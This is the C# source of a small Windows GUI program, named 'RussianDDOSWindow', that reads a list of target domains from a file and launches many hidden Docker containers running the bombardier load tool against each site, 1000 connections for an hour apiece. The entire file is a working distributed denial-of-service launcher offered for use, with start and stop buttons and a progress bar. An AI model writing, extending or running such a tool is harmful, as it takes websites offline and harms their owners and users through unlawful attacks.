using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;

namespace RussianDDOSWindow
{
    public partial class MainWindow : Window
    {
        readonly string[] list;
        List<Process> processes = new List<Process>();

        public MainWindow()
        {
            InitializeComponent();
            list = File.ReadLines("domains.txt").ToArray();
        }

        private async void Start_Button_Click(object sender, RoutedEventArgs e)
        {
            Stop_Button.IsEnabled = false;
            try
            {
                var count = int.Parse(DDOS_Count_TextBox.Text) + processes.Count;
                MainProgressBar.Maximum = count;

                for (int i = processes.Count, j = 0; i < count; i++, j++)
                {
                    if (j >= list.Length) j = 0;
                    var process = await StartProcess(list[j]);
                    processes.Add(process);
                    MainProgressBar.Value = processes.Count;
                }
            }
            catch (Exception err)
            {
                MessageBox.Show($"Some error occured: {err}");
            }
            Stop_Button.IsEnabled = true;
        }

        private async Task<Process> StartProcess(string domain)
        {
            string command = $"/C docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://{domain}";
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Minimized,
                FileName = "cmd.exe",
                Arguments = command
            };
            process.StartInfo = startInfo;
            await Task.Run(() => process.Start());
            return process;
        }

        private async void Stop_Button_Click(object sender, RoutedEventArgs e)
        {
            Start_Button.IsEnabled = false;
            for (int i = processes.Count - 1; i >= 0; i--)
            {
                await Task.Run(() => processes[i].CloseMainWindow());
                MainProgressBar.Value = i;
                processes.Remove(processes[i]);
            }
            Start_Button.IsEnabled = true;
        }
        private void Window_Closed(object sender, EventArgs e) => Stop_Button_Click(null, null);
    }
}